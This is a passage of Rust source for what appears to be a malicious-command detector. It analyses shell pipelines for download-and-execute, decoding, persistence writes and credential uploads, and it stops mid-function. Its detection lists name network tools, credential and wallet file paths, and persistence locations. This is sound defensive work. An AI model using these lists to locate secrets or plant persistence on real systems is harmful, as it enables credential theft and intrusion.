//! Structural analysis of parsed commands: pipelines that feed downloads or
//! decoded data into interpreters, substitutions whose output gets executed,
//! `-c`/`-e`/`-EncodedCommand` payloads, download-then-run sequences,
//! persistence writes and credential uploads.

use crate::lex::{self, Command, Parsed, RedirKind, SubstKind, Word};
use crate::{decode, normalize, sig, text, url, Dialect};

/// Maximum nesting of decoded/substituted content we follow.
const MAX_DEPTH: u32 = 4;
/// Maximum number of recursive analyses for one input.
const MAX_CALLS: u32 = 256;
/// Maximum total decoded bytes for one input.
const MAX_DECODED_TOTAL: usize = 64 * 1024;
/// Cap on the lowercase haystack used for `match_any` rules.
const MAX_HAYSTACK: usize = 128 * 1024;
/// Padding (consecutive spaces) that counts as hiding content.
const PADDING_MIN: usize = 30;

pub struct Ctx {
    pub signals: u64,
    pub urls: Vec<String>,
    pub hidden: Vec<String>,
    pub haystack: String,
    pub host: Option<String>,
    pub tool: Option<&'static str>,
    pub padding: usize,
    calls: u32,
    decoded_total: usize,
    posts: bool,
    xattr_quarantine: bool,
    anti_forensics: bool,
}

/// What a piece of text does, as seen from the code that contains it.
#[derive(Default, Clone, Copy)]
pub struct Facts {
    /// Writes downloaded data to stdout.
    pub net_output: bool,
    /// Writes decoded data to stdout.
    pub decoded_output: bool,
    /// Downloads something.
    pub download: bool,
    /// Executes downloaded or decoded code.
    pub exec: bool,
}

impl Facts {
    fn merge(&mut self, o: Facts) {
        self.download |= o.download;
        self.exec |= o.exec;
    }
}

impl Ctx {
    pub fn new(_dialect: Dialect) -> Self {
        Ctx {
            signals: 0,
            urls: Vec::new(),
            hidden: Vec::new(),
            haystack: String::new(),
            host: None,
            tool: None,
            padding: 0,
            calls: 0,
            decoded_total: 0,
            posts: false,
            xattr_quarantine: false,
            anti_forensics: false,
        }
    }

    fn add_hidden(&mut self, label: &str, s: &str) {
        if self.hidden.len() >= 8 {
            return;
        }
        let mut t: String = s
            .chars()
            .take(240)
            .map(|c| if c.is_control() { ' ' } else { c })
            .collect();
        if s.chars().count() > 240 {
            t.push('…');
        }
        let entry = format!("{label}: {}", t.trim());
        if !self.hidden.contains(&entry) {
            self.hidden.push(entry);
        }
    }

    /// Post-processing once all text has been analysed.
    pub fn finish(&mut self) {
        let mut best: Option<(u32, String)> = None;
        let mut plain_http = false;
        for u in &self.urls {
            let Some(h) = url::host(u) else { continue };
            if url::is_local(&h) {
                continue;
            }
            let s = url::classify(&h) | url::classify_url(u);
            self.signals |= s;
            if u.len() >= 7 && u[..7].eq_ignore_ascii_case("http://") {
                plain_http = true;
            }
            // Prefer the most suspicious host; on ties prefer the later URL,
            // which is usually the payload that actually gets run.
            let weight = s.count_ones() * 10
                + 1
                + u32::from(s & (sig::SUSPICIOUS_TLD | sig::RAW_IP_URL) != 0);
            if best.as_ref().map_or(true, |(w, _)| weight >= *w) {
                best = Some((weight, h));
            }
        }
        self.host = best.map(|(_, h)| h);
        let runs = sig::DOWNLOAD_EXEC | sig::DECODE_EXEC;
        if self.posts && self.signals & runs != 0 {
            self.signals |= sig::BEACON_POST;
        }
        if plain_http && self.signals & sig::DOWNLOAD_EXEC != 0 {
            self.signals |= sig::PLAIN_HTTP;
        }
        let fetches = sig::DOWNLOAD | runs;
        if (self.xattr_quarantine || self.anti_forensics) && self.signals & fetches != 0 {
            self.signals |= sig::SECURITY_TAMPER;
        }
    }
}

/// Analyse one piece of text (the input, a substitution, a `-c` string, a
/// decoded payload...). Signals accumulate in `ctx`; the returned facts
/// describe this text for its caller.
pub fn analyze_text(ctx: &mut Ctx, input: &str, depth: u32, dialect: Dialect) -> Facts {
    ctx.calls += 1;
    if depth > MAX_DEPTH || ctx.calls > MAX_CALLS {
        ctx.signals |= sig::OBFUSCATION;
        return Facts::default();
    }
    let n = normalize::normalize(input);
    if n.invisible {
        ctx.signals |= sig::INVISIBLE_CHARS;
    }
    let lower = n.text.to_lowercase();
    if ctx.haystack.len() + lower.len() < MAX_HAYSTACK {
        ctx.haystack.push_str(&lower);
        ctx.haystack.push('\n');
    }
    url::extract(&n.text, &mut ctx.urls);

    let ifs = n.text.contains("${IFS}") || n.text.contains("$IFS");
    let parsed = if ifs {
        ctx.signals |= sig::OBFUSCATION;
        let spaced = n.text.replace("${IFS}", " ").replace("$IFS", " ");
        lex::parse(&spaced, &[])
    } else {
        lex::parse(&n.text, &n.confusable_at)
    };
    if parsed.confusable {
        ctx.signals |= sig::CONFUSABLE_CHARS;
    }
    if parsed.padding >= PADDING_MIN && !parsed.padded_tail.trim().is_empty() {
        ctx.signals |= sig::WHITESPACE_PADDING;
        if parsed.padding > ctx.padding {
            ctx.padding = parsed.padding;
        }
        let label = format!("hidden after {} spaces", parsed.padding);
        ctx.add_hidden(&label, &parsed.padded_tail);
    }
    if parsed.comments.iter().any(|c| text::decoy_comment(c)) {
        ctx.signals |= sig::DECOY_COMMENT;
    }

    let mut facts = Facts::default();
    commands(ctx, &parsed, depth, dialect, &mut facts);

    let tf = text::scan(&lower, &n.text);
    ctx.signals |= tf.signals;
    if ctx.tool.is_none() {
        ctx.tool = tf.tool;
    }
    facts.download |= tf.download;
    facts.exec |= tf.exec;
    ctx.posts |= tf.posts;
    ctx.xattr_quarantine |= tf.xattr_quarantine;
    ctx.anti_forensics |= tf.anti_forensics;
    for (label, t) in tf.decoded {
        if let Some(f) = decoded(ctx, label, &t, depth) {
            facts.merge(f);
        }
    }
    facts
}

/// Record and (budget permitting) analyse a decoded payload.
fn decoded(ctx: &mut Ctx, label: &str, t: &str, depth: u32) -> Option<Facts> {
    ctx.add_hidden(label, t);
    if ctx.decoded_total + t.len() > MAX_DECODED_TOTAL {
        ctx.signals |= sig::OBFUSCATION;
        return None;
    }
    ctx.decoded_total += t.len();
    Some(analyze_text(ctx, t, depth + 1, Dialect::Auto))
}

// ---------------------------------------------------------------------
// Command classification
// ---------------------------------------------------------------------

#[derive(Clone, Copy, PartialEq, Eq)]
enum Kind {
    Other,
    Shell,
    Script,
    PowerShell,
    Cmd,
    EvalLike,
}

struct View<'a> {
    name: String,
    kind: Kind,
    /// Index of argv0 in `cmd.words`.
    at: usize,
    args: &'a [Word],
    detach: bool,
    obfuscated: bool,
}

impl View<'_> {
    fn arg(&self, i: usize) -> Option<&str> {
        self.args.get(i).map(|w| w.text.as_str())
    }
    fn has(&self, flags: &[&str]) -> bool {
        self.args.iter().any(|w| flags.contains(&w.text.as_str()))
    }
    fn has_ci(&self, flags: &[&str]) -> bool {
        self.args
            .iter()
            .any(|w| flags.iter().any(|f| w.text.eq_ignore_ascii_case(f)))
    }
    /// Value following any of `flags`.
    fn value(&self, flags: &[&str]) -> Option<&str> {
        let i = self
            .args
            .iter()
            .position(|w| flags.contains(&w.text.as_str()))?;
        self.arg(i + 1)
    }
    /// Index (into args) of the first operand (non-option argument).
    fn first_operand(&self) -> Option<usize> {
        let mut i = 0;
        while let Some(w) = self.args.get(i) {
            if w.text == "--" {
                return (i + 1 < self.args.len()).then_some(i + 1);
            }
            if !w.text.starts_with('-') || w.text == "-" {
                return Some(i);
            }
            i += 1;
        }
        None
    }
}

fn base_name(s: &str) -> String {
    let b = s.rsplit(['/', '\\']).next().unwrap_or(s);
    let mut l = b.to_ascii_lowercase();
    if l.ends_with(".exe") {
        l.truncate(l.len() - 4);
    }
    l
}

fn classify_kind(name: &str) -> Kind {
    match name {
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "mksh" | "fish" | "csh" | "tcsh" | "ash"
        | "yash" | "busybox" => Kind::Shell,
        "powershell" | "pwsh" | "powershell_ise" => Kind::PowerShell,
        "cmd" => Kind::Cmd,
        "eval" | "source" | "." | "exec" | "iex" | "invoke-expression" => Kind::EvalLike,
        n if n.starts_with("python")
            || matches!(
                n,
                "perl"
                    | "ruby"
                    | "node"
                    | "nodejs"
                    | "deno"
                    | "bun"
                    | "php"
                    | "lua"
                    | "osascript"
                    | "jsc"
                    | "rscript"
                    | "tclsh"
                    | "wscript"
                    | "cscript"
            ) =>
        {
            Kind::Script
        }
        _ => Kind::Other,
    }
}

fn is_assignment(w: &Word) -> bool {
    let t = &w.text;
    match t.find('=') {
        Some(p) if p > 0 => {
            t[..p]
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || b == b'_')
                && !t.as_bytes()[0].is_ascii_digit()
        }
        _ => false,
    }
}

/// Expand `$a$b` / `${a}${b}` using simple assignments seen earlier.
fn expand_vars(t: &str, vars: &[(String, String)]) -> Option<String> {
    if vars.is_empty() || !t.contains('$') {
        return None;
    }
    let mut out = String::new();
    let mut rest = t;
    let mut changed = false;
    while let Some(p) = rest.find('$') {
        out.push_str(&rest[..p]);
        let after = &rest[p + 1..];
        let (name, used) = if let Some(b) = after.strip_prefix('{') {
            let e = b.find('}')?;
            (&b[..e], e + 2)
        } else {
            let e = after
                .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
                .unwrap_or(after.len());
            (&after[..e], e)
        };
        match vars.iter().rev().find(|(k, _)| k == name) {
            Some((_, v)) if !name.is_empty() => {
                out.push_str(v);
                changed = true;
            }
            _ => {
                out.push('$');
                out.push_str(&after[..used]);
            }
        }
        rest = &after[used..];
    }
    out.push_str(rest);
    changed.then_some(out)
}

fn view<'a>(cmd: &'a Command, vars: &[(String, String)]) -> Option<View<'a>> {
    let words = &cmd.words;
    let mut i = 0;
    let mut detach = false;
    while let Some(w) = words.get(i) {
        if is_assignment(w) {
            i += 1;
            continue;
        }
        let n = base_name(&w.text);
        let takes_value: &[&str] = match n.as_str() {
            "sudo" | "doas" | "run0" | "pkexec" => &[
                "-u", "-g", "-h", "-p", "-C", "-D", "-r", "-t", "-U", "--user",
            ],
            "env" => &["-u", "-C", "-S", "--unset", "--chdir"],
            "nice" | "ionice" => &["-n", "-c", "--adjustment"],
            "timeout" => &["-s", "-k", "--signal", "--kill-after"],
            "xargs" => &["-I", "-n", "-P", "-L", "-d", "-E", "-s", "-a"],
            "stdbuf" | "time" | "command" | "builtin" | "unbuffer" | "chronic" | "caffeinate"
            | "flock" => &[],
            "nohup" | "setsid" | "disown" => {
                detach = true;
                &[]
            }
            _ => break,
        };
        i += 1;
        while let Some(w) = words.get(i) {
            if is_assignment(w) && n == "env" {
                i += 1;
            } else if w.text.starts_with('-') && w.text != "-" {
                i += if takes_value.contains(&w.text.as_str()) {
                    2
                } else {
                    1
                };
            } else {
                break;
            }
        }
        if n == "timeout"
            && words
                .get(i)
                .is_some_and(|w| w.text.bytes().next().is_some_and(|b| b.is_ascii_digit()))
        {
            i += 1;
        }
    }
    let w0 = words.get(i)?;
    let expanded = if w0.has_var {
        expand_vars(&w0.text, vars)
    } else {
        None
    };
    let name = base_name(expanded.as_deref().unwrap_or(&w0.text));
    let obfuscated = expanded.is_some()
        || w0.escaped_letter
        || w0.split_quotes
        || w0.ansi_c
        || (w0.has_var && !w0.text.starts_with('$'))
        || (!name.is_ascii() && name.chars().any(|c| c.is_alphabetic()));
    Some(View {
        kind: classify_kind(&name),
        name,
        at: i,
        args: &words[i + 1..],
        detach,
        obfuscated,
    })
}

const DOWNLOADERS: &[&str] = &[
    "curl",
    "wget",
    "wget2",
    "fetch",
    "aria2c",
    "axel",
    "http",
    "https",
    "xh",
    "xhs",
    "lwp-request",
    "get",
    "irm",
    "iwr",
    "invoke-restmethod",
    "invoke-webrequest",
    "start-bitstransfer",
    "httpie",
];
const NET_READERS: &[&str] = &[
    "nc", "ncat", "netcat", "socat", "telnet", "finger", "nslookup", "dig", "host", "drill",
    "kdig", "openssl",
];

fn is_downloader(v: &View) -> bool {
    DOWNLOADERS.contains(&v.name.as_str())
        || (v.name == "certutil" && v.has_ci(&["-urlcache", "/urlcache", "-verifyctl"]))
        || (v.name == "bitsadmin" && v.has_ci(&["/transfer"]))
}

fn is_net_reader(v: &View) -> bool {
    is_downloader(v) || NET_READERS.contains(&v.name.as_str())
}

/// Downloader whose output goes to stdout (so it can be piped or captured).
fn writes_stdout(v: &View) -> bool {
    match v.name.as_str() {
        "curl" => {
            !v.args.iter().any(|w| {
                let t = w.text.as_str();
                t == "-o"
                    || t == "-O"
                    || t == "--output"
                    || t == "--remote-name"
                    || t == "--remote-name-all"
                    || (t.starts_with('-')
                        && !t.starts_with("--")
                        && (t.ends_with('o') || t.ends_with('O'))
                        && t.len() <= 6)
            }) || v.value(&["-o", "--output"]) == Some("-")
        }
        "wget" | "wget2" => v.args.iter().enumerate().any(|(i, w)| {
            let t = w.text.as_str();
            (t.starts_with('-')
                && !t.starts_with("--")
                && t.ends_with('O')
                && v.arg(i + 1) == Some("-"))
                || t == "-O-"
                || t == "-qO-"
                || t == "--output-document=-"
                || t.ends_with("O-")
        }),
        "iwr" | "invoke-webrequest" => !v.has_ci(&["-outfile"]),
        "irm" | "invoke-restmethod" | "http" | "https" | "xh" | "xhs" | "httpie"
        | "lwp-request" | "get" => true,
        "fetch" => v.value(&["-o"]) == Some("-"),
        _ => false,
    }
}

fn is_decoder(v: &View) -> bool {
    match v.name.as_str() {
        "base64" | "base32" | "basenc" => v.has(&["-d", "--decode", "-D", "-di", "-id"]),
        "openssl" => {
            v.has(&["-d"])
                || v.args
                    .first()
                    .is_some_and(|w| w.text == "base64" && v.has(&["-d", "-A"]))
        }
        "xxd" => v
            .args
            .iter()
            .any(|w| w.text.starts_with('-') && w.text.contains('r')),
        "uudecode" | "gunzip" | "zcat" | "bunzip2" | "unxz" | "xzcat" | "rev" | "b64decode" => true,
        "gzip" | "bzip2" | "xz" | "zstd" => v
            .args
            .iter()
            .any(|w| w.text.starts_with('-') && w.text.contains('d')),
        "tr" => v
            .args
            .iter()
            .any(|w| w.text.contains("n-za-m") || w.text.contains("N-ZA-M")),
        "certutil" => v.has_ci(&["-decode", "/decode", "-decodehex"]),
        n if n.starts_with("python") => v.value(&["-m"]) == Some("base64"),
        _ => false,
    }
}

/// The interpreter reads its program from stdin.
fn stdin_exec(v: &View) -> bool {
    match v.kind {
        Kind::Shell => {
            if v.name == "busybox" {
                return v.arg(0).is_some_and(|a| matches!(a, "sh" | "ash" | "bash"))
                    && v.args.len() == 1;
            }
            let has_c = v.args.iter().any(|w| short_flag_has(&w.text, 'c'));
            if has_c {
                return false;
            }
            if v.args.iter().any(|w| short_flag_has(&w.text, 's')) {
                return true;
            }
            match v.first_operand() {
                None => true,
                Some(i) => v.args[i].text == "-",
            }
        }
        Kind::Script => {
            if v.has(&[
                "-c", "-e", "-E", "-m", "-r", "-p", "--eval", "--print", "-x",
            ]) {
                return false;
            }
            match v.first_operand() {
                None => !matches!(v.name.as_str(), "deno" | "bun" | "wscript" | "cscript"),
                Some(i) => v.args[i].text == "-" || v.args[i].text == "/dev/stdin",
            }
        }
        Kind::PowerShell => {
            v.args.is_empty()
                || v.args.iter().any(|w| w.text == "-")
                || v.args.iter().all(|w| {
                    w.text.starts_with('-')
                        && !is_ps_param(&w.text, "command")
                        && !is_ps_param(&w.text, "file")
                        && !is_ps_param(&w.text, "encodedcommand")
                })
        }
        Kind::Cmd => !v
            .args
            .iter()
            .any(|w| matches!(w.text.to_ascii_lowercase().as_str(), "/c" | "/k" | "/r")),
        Kind::EvalLike => match v.name.as_str() {
            "iex" | "invoke-expression" => v.args.is_empty(),
            "source" | "." => v.arg(0).is_some_and(|a| a == "/dev/stdin" || a == "-"),
            _ => false,
        },
        Kind::Other => false,
    }
}

fn short_flag_has(t: &str, f: char) -> bool {
    t.len() >= 2
        && t.len() <= 6
        && t.starts_with('-')
        && !t.starts_with("--")
        && t[1..].chars().all(|c| c.is_ascii_alphabetic())
        && t[1..].contains(f)
}

/// PowerShell accepts any unambiguous prefix of a parameter name.
fn is_ps_param(arg: &str, full: &str) -> bool {
    let a = arg.trim_start_matches(['-', '/']).to_ascii_lowercase();
    if a.is_empty() || !(arg.starts_with('-') || arg.starts_with('/')) {
        return false;
    }
    match full {
        "encodedcommand" => {
            matches!(
                a.as_str(),
                "e" | "ec" | "en" | "enc" | "enco" | "encod" | "encode" | "encoded"
            ) || ("encodedcommand".starts_with(&a) && a.len() >= 3)
        }
        "command" => a == "c" || (a.len() >= 2 && "command".starts_with(&a)),
        "file" => a == "f" || (a.len() >= 2 && "file".starts_with(&a)),
        "windowstyle" => !a.is_empty() && "windowstyle".starts_with(&a) && a.starts_with('w'),
        _ => a == full,
    }
}

// ---------------------------------------------------------------------
// Paths
// ---------------------------------------------------------------------

fn path_signal(p: &str) -> u64 {
    let l = p.to_ascii_lowercase().replace('\\', "/");
    const PERSIST: &[&str] = &[
        ".config/autostart",
        "/etc/xdg/autostart",
        ".config/systemd/user",
        ".local/share/systemd/user",
        "/etc/systemd/system",
        "/lib/systemd/system",
        "/usr/lib/systemd/user",
        "/etc/cron",
        "/var/spool/cron",
        "library/launchagents",
        "library/launchdaemons",
        ".ssh/authorized_keys",
        "/start menu/programs/startup",
        "shell:startup",
        ".git/hooks/",
        "/etc/ld.so.preload",
        "/etc/rc.local",
        "/etc/init.d/",
        "currentversion/run",
    ];
    const RC: &[&str] = &[
        ".bashrc",
        ".bash_profile",
        ".bash_login",
        ".profile",
        ".zshrc",
        ".zprofile",
        ".zshenv",
        ".zlogin",
        "config.fish",
        "/etc/profile",
        "/etc/bash.bashrc",
        "/etc/environment",
        ".xprofile",
        ".xsessionrc",
        "environment.d",
        ".pam_environment",
    ];
    if PERSIST.iter().any(|s| l.contains(s)) {
        sig::PERSISTENCE
    } else if RC.iter().any(|s| l.contains(s)) {
        sig::RC_WRITE
    } else {
        0
    }
}

fn sensitive_path(p: &str) -> bool {
    let l = p.to_ascii_lowercase().replace('\\', "/");
    if l.ends_with(".pub") {
        return false;
    }
    const S: &[&str] = &[
        ".ssh/",
        ".aws/credentials",
        ".config/gh/",
        ".kube/config",
        ".docker/config.json",
        ".netrc",
        ".git-credentials",
        ".npmrc",
        ".pypirc",
        "login data",
        "cookies",
        "local state",
        ".mozilla/firefox",
        "keychain",
        ".gnupg",
        "wallet",
        ".electrum",
        "exodus",
        "metamask",
        ".config/solana",
        ".bash_history",
        ".zsh_history",
        ".claude/",
        ".config/bitwarden",
        "/keyrings/",
        ".env",
        "/etc/shadow",
        ".password-store",
    ];
    S.iter().any(|s| l.contains(s))
}

fn file_key(p: &str) -> String {
    base_name(p.trim_matches(['"', '\'']))
}

fn url_basename(u: &str) -> Option<String> {
    let path = u.split(['?', '#']).next()?;
    let last = path.rsplit('/').next()?;
    (!last.is_empty() && !last.contains("://") && path.matches('/').count() >= 3)
        .then(|| last.to_ascii_lowercase())
}

/// Files a downloader writes to (lowercase base names).
fn downloaded_files(v: &View, cmd: &Command, out: &mut Vec<String>) {
    let mut push = |s: &str| {
        if !s.is_empty() && s != "-" {
            out.push(file_key(s));
        }
    };
    for r in &cmd.redirs {
        if matches!(r.kind, RedirKind::Out | RedirKind::Append) {
            push(&r.target.text);
        }
    }
    let first_url = v
        .args
        .iter()
        .find(|w| w.text.contains("://"))
        .map(|w| w.text.as_str());
    match v.name.as_str() {
        "curl" | "aria2c" => {
            if let Some(f) = v.value(&["-o", "--output"]) {
                push(f);
            }
            for (i, w) in v.args.iter().enumerate() {
                let t = w.text.as_str();
                if t.starts_with('-') && !t.starts_with("--") && t.len() > 2 && t.ends_with('o') {
                    if let Some(f) = v.arg(i + 1) {
                        push(f);
                    }
                }
            }
            if v.args.iter().any(|w| {
                w.text == "-O"
                    || w.text == "--remote-name"
                    || (w.text.starts_with('-')
                        && !w.text.starts_with("--")
                        && w.text.ends_with('O'))
            }) {
                if let Some(b) = first_url.and_then(url_basename) {
                    push(&b);
                }
            }
        }
        "wget" | "wget2" => {
            let mut explicit = false;
            for (i, w) in v.args.iter().enumerate() {
                let t = w.text.as_str();
                if let Some(f) = t.strip_prefix("--output-document=") {
                    push(f);
                    explicit = true;
                } else if t.starts_with('-') && !t.starts_with("--") && t.ends_with('O') {
                    if let Some(f) = v.arg(i + 1) {
                        push(f);
                    }
                    explicit = true;
                }
            }
            if !explicit {
                if let Some(b) = first_url.and_then(url_basename) {
                    push(&b);
                }
            }
        }
        "iwr" | "invoke-webrequest" | "start-bitstransfer" => {
            for (i, w) in v.args.iter().enumerate() {
                if is_ps_param(&w.text, "outfile")
                    || w.text.eq_ignore_ascii_case("-outfile")
                    || w.text.eq_ignore_ascii_case("-destination")
                {
                    if let Some(f) = v.arg(i + 1) {
                        push(f);
                    }
                }
            }
        }
        "certutil" | "bitsadmin" => {
            if let Some(w) = v.args.last() {
                if !w.text.contains("://") {
                    push(&w.text);
                }
            }
        }
        _ => {}
    }
}

fn runs_downloaded(v: &View, cmd: &Command, files: &[String]) -> bool {
    if files.is_empty() {
        return false;
    }
    let hit = |s: &str| files.contains(&file_key(s));
    let argv0 = &cmd.words[v.at].text;
    if (argv0.contains('/') || argv0.contains('\\') || argv0.starts_with('.')) && hit(argv0) {
        return true;
    }
    match v.kind {
        Kind::Shell | Kind::Script | Kind::EvalLike | Kind::PowerShell => {
            if let Some(i) = v.first_operand() {
                if hit(&v.args[i].text) {
                    return true;
                }
            }
            if stdin_exec(v)
                && cmd
                    .redirs
                    .iter()
                    .any(|r| r.kind == RedirKind::In && hit(&r.target.text))
            {
                return true;
            }
        }
        _ => {}
    }
    matches!(
        v.name.as_str(),
        "start"
            | "start-process"
            | "saps"
            | "invoke-item"
            | "ii"
            | "open"
            | "msiexec"
            | "dpkg"
            | "apt"
            | "apt-get"
            | "rpm"
            | "yum"
            | "dnf"
            | "zypper"
            | "installer"
            | "hdiutil"
            | "&"
    ) && v.args.iter().any(|w| hit(&w.text))
}

// ---------------------------------------------------------------------
// Command walk
// ---------------------------------------------------------------------

#[derive(Default, Clone, Copy)]
struct CmdOut {
    net: bool,
    decoded: bool,
}

fn commands(ctx: &mut Ctx, parsed: &Parsed, depth: u32, dialect: Dialect, facts: &mut Facts) {
    let mut files: Vec<String> = Vec::new();
    let mut writes_persistence = false;
    let mut vars: Vec<(String, String)> = Vec::new();
    let mut pl_out: Vec<CmdOut> = Vec::with_capacity(parsed.pipelines.len());

    for pl in &parsed.pipelines {
        let views: Vec<Option<View>> = pl.cmds.iter().map(|c| view(c, &vars)).collect();
        let mut outs: Vec<CmdOut> = vec![CmdOut::default(); pl.cmds.len()];
        let mut detach = pl.background;

        // `(curl a || curl b) | sh`: the group's output feeds this pipeline.
        if let (Some((s, e)), Some(Some(first))) = (pl.group_input, views.first()) {
            let range = &pl_out[s.min(pl_out.len())..e.min(pl_out.len())];
            if stdin_exec(first) && range.iter().any(|o| o.net) {
                ctx.signals |= sig::DOWNLOAD_EXEC;
                facts.exec = true;
            }
            if stdin_exec(first) && range.iter().any(|o| o.decoded) {
                ctx.signals |= sig::DECODE_EXEC;
                facts.exec = true;
            }
        }

        for (j, cmd) in pl.cmds.iter().enumerate() {
            let Some(v) = views[j].as_ref() else {
                // Redirect-only commands like `> file` still matter for persistence.
                writes_persistence |= redirect_persistence(ctx, cmd);
                continue;
            };
            detach |= v.detach;
            if v.obfuscated {
                ctx.signals |= sig::OBFUSCATION;
            }
            if is_downloader(v) {
                ctx.signals |= sig::DOWNLOAD;
                facts.download = true;
                outs[j].net = writes_stdout(v);
                bare_hosts(ctx, v);
                uploads(ctx, v);
                downloaded_files(v, cmd, &mut files);
            } else if is_net_reader(v) {
                outs[j].net = true;
            }
            if is_decoder(v) {
                outs[j].decoded = true;
            }
            exfil(ctx, v, cmd);

            // Substitutions inside this command's words and redirects.
            for (k, w) in cmd.words.iter().enumerate() {
                for s in &w.substs {
                    let inner = analyze_text(ctx, &s.inner, depth + 1, dialect);
                    facts.merge(inner);
                    if subst_executes(v, cmd, k, s.kind) {
                        if inner.net_output || inner.download {
                            ctx.signals |= sig::DOWNLOAD_EXEC;
                            facts.exec = true;
                        }
                        if inner.decoded_output {
                            ctx.signals |= sig::DECODE_EXEC;
                            facts.exec = true;
                        }
                    } else if k > v.at
                        && matches!(v.name.as_str(), "echo" | "printf" | "print" | "cat")
                    {
                        outs[j].net |= inner.net_output;
                        outs[j].decoded |= inner.decoded_output;
                    }
                }
                if k > v.at {
                    blob(ctx, &w.text, depth);
                }
            }
            for r in &cmd.redirs {
                for s in &r.target.substs {
                    let inner = analyze_text(ctx, &s.inner, depth + 1, dialect);
                    facts.merge(inner);
                    if r.kind == RedirKind::HereStr
                        && stdin_exec(v)
                        && (inner.net_output || inner.download)
                    {
                        ctx.signals |= sig::DOWNLOAD_EXEC;
                        facts.exec = true;
                    }
                }
                if r.kind == RedirKind::HereStr {
                    if stdin_exec(v) {
                        let f = analyze_text(ctx, &r.target.text, depth + 1, dialect);
                        facts.merge(f);
                    } else if is_decoder(v) {
                        decode_literal(ctx, &r.target.text, depth, false);
                    }
                }
            }
            writes_persistence |= redirect_persistence(ctx, cmd);
            writes_persistence |= command_persistence(ctx, v);

            code_args(ctx, v, depth, facts);

            if runs_downloaded(v, cmd, &files) {
                ctx.signals |= sig::DOWNLOAD_EXEC;
                facts.exec = true;
            }
        }

        // Pipelines: something network/decoded upstream feeding an interpreter.
        for (j, vj) in views.iter().enumerate() {
            let Some(vj) = vj else { continue };
            let execs = stdin_exec(vj);
            for i in 0..j {
                let Some(vi) = views[i].as_ref() else {
                    continue;
                };
                if execs && outs[i].net {
                    ctx.signals |= sig::DOWNLOAD_EXEC;
                    facts.exec = true;
                }
                if execs && outs[i].decoded {
                    ctx.signals |= sig::DECODE_EXEC;
                    facts.exec = true;
                }
                // Literal code piped in: `echo '<code>' | sh` or `echo <b64> | base64 -d | sh`.
                if matches!(vi.name.as_str(), "echo" | "printf" | "print") {
                    let decoder_between = (i + 1..j).any(|k| outs[k].decoded);
                    for w in vi
                        .args
                        .iter()
                        .filter(|w| !w.text.starts_with('-') || w.text.len() > 3)
                    {
                        if execs && decoder_between {
                            decode_literal(ctx, &w.text, depth, true);
                        } else if execs && w.text.len() >= 4 {
                            let code =
                                if vi.name == "printf" || vi.args.iter().any(|a| a.text == "-e") {
                                    printf_unescape(&w.text)
                                } else {
                                    None
                                };
                            if code.is_some() {
                                ctx.signals |= sig::OBFUSCATION;
                            }
                            let f = analyze_text(
                                ctx,
                                code.as_deref().unwrap_or(&w.text),
                                depth + 1,
                                dialect,
                            );
                            facts.merge(f);
                        } else if is_decoder(vj) {
                            decode_literal(ctx, &w.text, depth, false);
                        }
                    }
                }
                // `cat <persistence file> ... | tee <path>` style writes.
                if vj.name == "tee"
                    && vj.args.iter().any(|w| path_signal(&w.text) != 0)
                    && matches!(vi.name.as_str(), "echo" | "printf" | "print" | "cat")
                {
                    writes_persistence = true;
                }
            }
            if vj.name == "tee" {
                for w in vj.args {
                    let s = path_signal(&w.text);
                    if s != 0 {
                        ctx.signals |= s;
                        writes_persistence = true;
                    }
                }
            }
            let crontab_install = vj.name == "crontab"
                && !vj.has(&["-l", "-e", "-r", "-ir"])
                && vj
                    .args
                    .iter()
                    .any(|w| w.text == "-" || !w.text.starts_with('-'));
            if crontab_install || (vj.name == "crontab" && j > 0 && !vj.has(&["-l"])) {
                ctx.signals |= sig::PERSISTENCE;
                writes_persistence = true;
            }
        }
        // Net output of this text as seen by an enclosing substitution.
        if let Some(last) = outs.last() {
            facts.net_output |= last.net;
            facts.decoded_output |= last.decoded;
        }
        if outs.iter().any(|o| o.net) && views.iter().flatten().all(|v| !stdin_exec(v)) {
            facts.net_output = true;
        }
        if detach {
            ctx.signals |= sig::BACKGROUND_DETACH;
        }
        let execs_here = views.iter().flatten().any(stdin_exec);
        pl_out.push(CmdOut {
            net: !execs_here && outs.iter().any(|o| o.net),
            decoded: !execs_here && outs.iter().any(|o| o.decoded),
        });
        // Remember plain assignments (`a=cu; b=rl; $a$b ...`).
        for c in &pl.cmds {
            if c.words.iter().all(is_assignment) {
                for w in &c.words {
                    if let Some((k, v)) = w.text.split_once('=') {
                        if vars.len() < 64 {
                            vars.push((k.to_string(), v.to_string()));
                        }
                    }
                }
            }
        }
    }

    // Code written to a startup location runs later: analyse it now.
    if writes_persistence {
        for pl in &parsed.pipelines {
            for cmd in &pl.cmds {
                let Some(v) = view(cmd, &[]) else { continue };
                if matches!(v.name.as_str(), "echo" | "printf" | "print") {
                    for w in v.args {
                        if w.text.len() >= 6 {
                            let f = analyze_text(ctx, &w.text, depth + 1, dialect);
                            facts.merge(f);
                        }
                    }
                }
            }
        }
    }
}

/// Decode `\xHH` and `\NNN` escapes as printf/echo -e would. Returns `None`
/// when there were no such escapes.
fn printf_unescape(t: &str) -> Option<String> {
    if !t.contains("\\x") && !t.contains("\\0") {
        return None;
    }
    let b = t.as_bytes();
    let mut out = Vec::with_capacity(b.len());
    let mut i = 0;
    let mut hits = 0;
    while i < b.len() {
        if b[i] == b'\\' && i + 1 < b.len() {
            if b[i + 1] == b'x' {
                let hex: String = t[i + 2..]
                    .chars()
                    .take(2)
                    .take_while(|c| c.is_ascii_hexdigit())
                    .collect();
                if let Ok(v) = u8::from_str_radix(&hex, 16) {
                    out.push(v);
                    i += 2 + hex.len();
                    hits += 1;
                    continue;
                }
            } else if b[i + 1].is_ascii_digit() {
                let oct: String = t[i + 1..]
                    .chars()
                    .take(4)
                    .take_while(|c| ('0'..='7').contains(c))
                    .collect();
                if let Ok(v) = u8::from_str_radix(&oct, 8) {
                    out.push(v);
                    i += 1 + oct.len();
                    hits += 1;
                    continue;
                }
            }
        }
        out.push(b[i]);
        i += 1;
    }
    (hits >= 4).then(|| String::from_utf8_lossy(&out).into_owned())
}

fn subst_executes(v: &View, cmd: &Command, k: usize, kind: SubstKind) -> bool {
    if k == v.at {
        return true; // `$(curl ...)` in command position runs the output
    }
    if k < v.at {
        return false;
    }
    let ai = k - v.at - 1;
    match v.kind {
        Kind::EvalLike => true,
        Kind::Shell => {
            let after_c = ai > 0 && short_flag_has(&v.args[ai - 1].text, 'c');
